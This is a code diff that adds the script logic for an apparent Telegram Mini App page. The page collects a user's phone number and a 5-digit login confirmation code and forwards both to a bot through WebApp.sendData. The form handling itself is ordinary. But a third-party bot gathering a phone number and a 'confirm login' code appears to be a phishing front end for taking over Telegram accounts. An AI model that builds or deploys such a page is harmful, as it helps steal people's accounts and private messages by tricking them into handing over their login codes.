@@ -396,5 +396,207 @@
          */
         function initCodeInputs() {
             codeInputs.forEach((input, index) => {
-                // Очистка от нецифровых символов и ограничение длины
-         
+                // Очистка от нецифровых символов и ограничение длин
+                input.addEventListener('input', (e) => {
+                    input.value = input.value.replace(/\D/g, '').slice(0, 1);
+                    if (input.value.length === 1) {
+                        // Автоматический переход к следующему полю
+                        if (index < codeInputs.length - 1) {
+                            codeInputs[index + 1].focus();
+                        } else {
+                            // Последнее поле: снимаем фокус и отправляем форму
+                            input.blur();
+                            codeForm.dispatchEvent(new Event('submit'));
+                        }
+                    }
+                });
+
+                // Обработка клавиши Backspace
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && input.value === '') {
+                        if (index > 0) {
+                            // Переход к предыдущему полю
+                            codeInputs[index - 1].focus();
+                        }
+                    }
+                });
+                
+                // Обработка Ctrl+V/Вставки
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pasteData = (e.clipboardData || window.clipboardData)
+                                        .getData('text')
+                                        .replace(/\D/g, '') // Удаляем все, кроме цифр
+                                        .slice(0, codeInputs.length - index); // Ограничиваем длиной оставшихся полей
+
+                    for (let i = 0; i < pasteData.length; i++) {
+                        if (index + i < codeInputs.length) {
+                            codeInputs[index + i].value = pasteData[i];
+                            // Переводим фокус на следующее после вставки
+                            if (index + i < codeInputs.length - 1) {
+                                codeInputs[index + i + 1].focus();
+                            } else {
+                                codeInputs[index + i].blur();
+                                codeForm.dispatchEvent(new Event('submit'));
+                            }
+                        }
+                    }
+                });
+            });
+
+            // Обработчик для ссылки "Отправить еще раз"
+            sendAgainLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                displayMessage('Запрос на повторную отправку кода будет отправлен боту.', 'info');
+                // В реальном приложении здесь должна быть логика отправки запроса боту 
+                // на повторную отправку кода (WebApp.sendData с другим step/payload).
+            });
+        }
+
+        /**
+         * Определяет, какой шаг нужно показать, основываясь на параметре URL.
+         */
+        function checkStep() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const step = urlParams.get('step');
+
+            if (step === 'code') {
+                showCodeStep();
+            } else {
+                showPhoneStep();
+            }
+        }
+
+        /**
+         * Показать форму ввода телефона.
+         */
+        function showPhoneStep() {
+            phoneStep.classList.remove('hidden');
+            codeStep.classList.add('hidden');
+            WebApp.setParams({ 'step': 'phone' });
+            WebApp.ready();
+        }
+
+        /**
+         * Показать форму ввода кода.
+         */
+        function showCodeStep() {
+            phoneStep.classList.add('hidden');
+            codeStep.classList.remove('hidden');
+            WebApp.setParams({ 'step': 'code' });
+            WebApp.ready();
+            // Фокусируемся на первом поле кода
+            codeInputs[0].focus(); 
+        }
+
+        /**
+         * Отображает сообщение (успех/ошибка) на экране.
+         * @param {string} text Текст сообщения.
+         * @param {'error'|'success'|'info'} type Тип сообщения.
+         */
+        function displayMessage(text, type = 'info') {
+            messageText.innerText = text;
+            messageContainer.classList.remove('hidden', 'bg-red-800/20', 'text-red-300', 'bg-green-800/20', 'text-green-300', 'bg-blue-800/20', 'text-blue-300');
+
+            if (type === 'error') {
+                messageContainer.classList.add('bg-red-800/20', 'text-red-300');
+            } else if (type === 'success') {
+                messageContainer.classList.add('bg-green-800/20', 'text-green-300');
+            } else {
+                messageContainer.classList.add('bg-blue-800/20', 'text-blue-300');
+            }
+        }
+
+        /**
+         * Обработчик отправки формы номера телефона.
+         */
+        phoneForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const rawNumber = phoneInput.value.trim();
+            
+            if (!selectedCountry) {
+                displayMessage('Пожалуйста, выберите страну.', 'error');
+                return;
+            }
+
+            // Валидация длины
+            if (rawNumber.length !== selectedCountry.length) {
+                displayMessage(`Необходимо ввести ${selectedCountry.length} цифр в номере. Вы ввели ${rawNumber.length}.`, 'error');
+                return;
+            }
+
+            // Собираем полный номер телефона
+            const fullPhone = selectedCountry.code + rawNumber;
+
+            // Блокируем кнопку и показываем лоадер
+            phoneButton.disabled = true;
+            phoneButton.innerText = 'Отправка...';
+
+            displayMessage(`Отправка номера телефона ${fullPhone} боту...`);
+
+            // Отправка данных боту
+            const data = {
+                step: 'phone',
+                phone: fullPhone
+            };
+            
+            try {
+                // WebApp.sendData закрывает WebApp. Бот обработает данные.
+                WebApp.sendData(JSON.stringify(data));
+            } catch (error) {
+                displayMessage('Ошибка при отправке данных в Telegram: ' + error.message, 'error');
+                phoneButton.disabled = false;
+                phoneButton.innerText = 'Получить код';
+            }
+        });
+
+        /**
+         * Обработчик отправки формы кода подтверждения.
+         */
+        codeForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Собираем код из 5 полей
+            const code = codeInputs.map(input => input.value).join('');
+
+            if (code.length !== codeInputs.length) {
+                displayMessage(`Пожалуйста, введите ${codeInputs.length}-значный код полностью.`, 'error');
+                return;
+            }
+            if (code.replace(/\D/g, '').length !== codeInputs.length) {
+                displayMessage('Код может содержать только цифры.', 'error');
+                return;
+            }
+
+
+            // Блокируем кнопку и показываем лоадер
+            codeButton.disabled = true;
+            codeButton.innerText = 'Подтверждение...';
+
+            displayMessage('Проверка кода...');
+
+            // Отправка данных боту
+            const data = {
+                step: 'code',
+                code: code
+            };
+
+            try {
+                // WebApp.sendData закрывает WebApp. Бот обработает данные.
+                WebApp.sendData(JSON.stringify(data));
+            } catch (error) {
+                displayMessage('Ошибка при отправке данных в Telegram: ' + error.message, 'error');
+                codeButton.disabled = false;
+                codeButton.innerText = 'Подтвердить вход';
+            }
+        });
+
+        // Запуск инициализации после загрузки скрипта WebApp
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initWebApp);
+        } else {
+            initWebApp();
+        }
+    </script>
+</body>
+</html>
